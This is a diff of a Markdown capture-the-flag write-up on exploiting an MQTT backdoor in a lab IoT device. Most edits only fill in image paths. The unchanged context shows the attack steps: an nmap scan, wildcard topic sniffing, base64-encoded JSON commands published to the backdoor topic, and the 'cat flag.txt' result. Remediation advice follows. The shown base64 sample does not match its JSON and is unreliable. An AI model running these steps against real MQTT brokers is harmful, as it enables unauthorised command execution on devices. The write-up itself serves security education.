@@ -1,6 +1,6 @@
 # IoT MQTT Backdoor Exploitation Write-Up  
-**Author:** Mohammad Meraj  
-**Date:** 10-12-2025
+**Author:** Mohammad Meraj   
+**Date:** 11-12-2025
 
 ---
 
@@ -16,8 +16,8 @@ The exploitation demonstrates how **insecure MQTT implementations** can lead to 
 
 ### Initial Port Scan
 An Nmap scan was performed to identify open services on the target:
+![alt text](Images/01_nmap_mqtt_discovery.png)
 
-![Nmap Discovery] 
 
 ```
 nmap -sV -p- 10.81.170.4
@@ -35,7 +35,8 @@ The MQTT service was identified as the primary attack surface for IoT communicat
 
 Installed necessary MQTT client utilities:
 
-![Tool Installation] 
+![alt text](Images/02_tool_installation.png)
+
 
 ```bash
 sudo apt install mosquitto mosquitto-clients
@@ -51,8 +52,8 @@ sudo apt install mosquitto mosquitto-clients
 
 ### Subscribing to All MQTT Traffic
 Subscribed to all topics using a wildcard to capture device communications:
+![alt text](Images/03_initial_mqtt_traffic.png)
 
-![Initial MQTT Traffic] 
 
 ```bash
 mosquitto_sub -h $BROKER_IP -r "#" -v
@@ -78,8 +79,8 @@ A base64 payload from a config topic revealed the backdoor structure:
 
 ### Testing the HELP Command
 First test with the HELP command to understand functionality:
-
-![Help Command Testing] 
+![alt text](Images/05_help_command_testing.png)
+ 
 
 ### Key Findings
 * Device accepts **3 remote commands**: HELP, CMD, SYS  
@@ -93,8 +94,8 @@ First test with the HELP command to understand functionality:
 
 ### First Attempt – Plain JSON
 Attempting to send raw JSON resulted in an error:
+![alt text](Images/06_error_base64_requirement.png)
 
-![Error: Base64 Requirement] 
 
 ```
 Invalid message format. Format: base64(...)
@@ -112,10 +113,10 @@ The device required commands in this JSON structure, then base64-encoded:
 ```
 
 ### Initial JSON Command Attempt
-![JSON Command Attempt] 
+![alt text](Images/07_json_command_attempt.png)
 
 ### Testing Base64 Encoding
-![Base64 Encoding Attempt] 
+![alt text](Images/08_base64_encoding_attempt.png)
 
 ---
 
@@ -123,8 +124,8 @@ The device required commands in this JSON structure, then base64-encoded:
 
 ## 1. Crafting the JSON Payload
 Example for executing `ls`:
+![alt text](Images/09_cyberchef_ls_command.png)
 
-![CyberChef LS Command] 
 
 ```json
 {"id": "cdd1b1c0-1c40-4b0f-8e22-61b357548b7d", "cmd": "CMD", "arg": "ls"}
@@ -143,16 +144,15 @@ eyJpZC16ICJjZGQxYjFjMCoxYZQwLTRiMGYtOGUyMi82MMIzMTc1MDhiM2QiLCAIY21kIjogIKMNRCIs
 ```
 
 ## 3. Publishing to the Backdoor Topic
+![alt text](Images/10_executing_ls_command.png)
 
-![Executing LS Command] 
 ```bash
 mosquitto_pub -h $BROKER_IP -t "U4vyqNLQtf/OvozmaZyLT/15H9TF6CHg/pub" -m "<base64-payload>"
 ```
 
 ## 4. Listening for Responses
 Received the response for `ls` command:
-
-![LS Response] 
+![alt text](Images/11_ls_response.png)
 
 ```bash
 mosquitto_sub -h $BROKER_IP -t "XD2rfR9Bez/GqMpRSEobh/TvLQehMg0E/sub"
@@ -165,27 +165,27 @@ mosquitto_sub -h $BROKER_IP -t "XD2rfR9Bez/GqMpRSEobh/TvLQehMg0E/sub"
 ### Running `ls` Command
 **Payload Sent:** Base64-encoded `ls` command  
 **Response Received (decoded):**
+![alt text](Images/12_flag_txt_response.png)
 
-![Flag.txt Response] 
 
 ```json
 {"id": "cdd1b1c0-1c40-4b0f-8e22-61b357548b7d", "response": "flag.txt\n"}
 ```
 
 ### Preparing `cat flag.txt` Command
-![CyberChef Cat Command] 
+![alt text](Images/13_cyberchef_cat_command.png)!
 
 ### Executing the Flag Read Command
-![Command Execution] 
+![alt text](Images/14_command_execution.png)
 
 **Payload Sent:** Base64-encoded `cat flag.txt` command  
 
 ### Receiving Base64 Response
-![Base64 Response] 
+![alt text](Images/15_base64_response.png)
 
 **Response Received (decoded):**
+![alt text](Images/16_final_flag_decoded.png)
 
-![Final Flag Decoded] 
 
 ```json
 {
@@ -220,7 +220,7 @@ flag{18d44fc0707ac8dc8be45bb83db54013}
 
 ---
 
-# 🔧 Remediation
+# Remediation
 
 ### 1. **Enable MQTT Authentication**
    Implement username/password authentication for all broker connections:
